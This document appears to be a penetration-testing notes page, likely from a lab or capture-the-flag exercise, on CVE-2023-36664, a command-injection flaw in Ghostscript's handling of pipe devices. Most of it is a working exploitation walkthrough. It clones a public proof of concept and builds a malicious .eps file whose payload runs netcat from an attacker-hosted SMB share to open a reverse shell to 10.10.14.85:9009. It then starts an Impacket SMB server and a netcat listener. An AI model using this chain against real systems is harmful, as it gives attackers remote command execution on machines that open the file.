# CVE-2023-36664

Vulnerability disclosed in Ghostscript prior to version 10.01.2 leads to code execution.

> Artifex Ghostscript through 10.01.2 mishandles permission validation for pipe devices (with the %pipe% prefix or the | pipe character prefix).

The exploitation can occur upon opening a PS or EPS file and can allow code execution caused by Ghostscript mishandling permission validation for pipe devices.



## PoC

{% embed url="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection" %}

<figure><img src="../.gitbook/assets/image (239).png" alt="" width="563"><figcaption></figcaption></figure>

The schema above will be the strategy that we will use for exploitation phase.



### Clone the CVE PoC repo

```bash
git clone https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection
```



### Build .eps payload with RevShell

We will use the python script to generate a .eps file that, when opened , it will create a connection to the attacker machine using NetCat in a SMB Shares (hosted from attacker machine).

{% code overflow="wrap" %}
```bash
python3 CVE_2023_36664_exploit.py --inject --payload 'cmd.exe /c \\\\10.10.14.85\\smbFolder\\nc64.exe -e cmd 10.10.14.85 9009' --filename payload.eps
```
{% endcode %}



### Starting a SMB Server with nc64.exe inside

Now, we're starting a SMB Server with Impacket tool with NetCat (nc64.exe)

```bash
# download the nc64.exe
wget https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe

# start smb server in the current directory
impacket-smbserver smbFolder $(pwd) -smb2support
```



### Starting listener on Kali

```
nc -lnvp 9009
```

### Exploitation

When the .eps file will execute, a connection in a NetCat listener will appair.
